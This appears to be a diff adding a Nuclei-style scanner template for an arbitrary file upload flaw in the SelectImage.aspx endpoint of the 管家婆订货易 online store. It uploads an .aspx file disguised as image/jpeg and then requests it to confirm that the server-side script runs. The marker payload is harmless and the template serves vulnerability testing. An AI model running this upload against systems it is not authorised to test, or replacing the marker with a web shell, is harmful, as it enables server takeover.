@@ -1,0 +1,51 @@
+id: poc-guan-jia-po-selectimage-aspx-anyfile-upload
+info:
+  name: 管家婆订货易在线商城 SelectImage.aspx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+flow: |
+  http(1) && http(2)
+
+variables:
+  random_marker: '{{rand_base(4)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true'
+    headers:
+      Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b
+    body: |-
+      --532c7611457d40f4ae4cd9422973416b
+      Content-Disposition: form-data; name="Filedata"; filename="TEST.aspx"
+      Content-Type: image/jpeg
+
+      <% Response.Write("{{random_marker}}"); %>
+      --532c7611457d40f4ae4cd9422973416b--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "aspx"
+          - "UploadImage"
+        condition: and
+    extractors:
+      - type: regex
+        name: uploaded_file
+        internal: true
+        regex:
+          - "(?P<file_id>[0-9_]{19})"
+        group: 1
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/templates/master/pc/fangmeilele/UploadImage/titleimg/{{uploaded_file}}.aspx'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{random_marker}}'
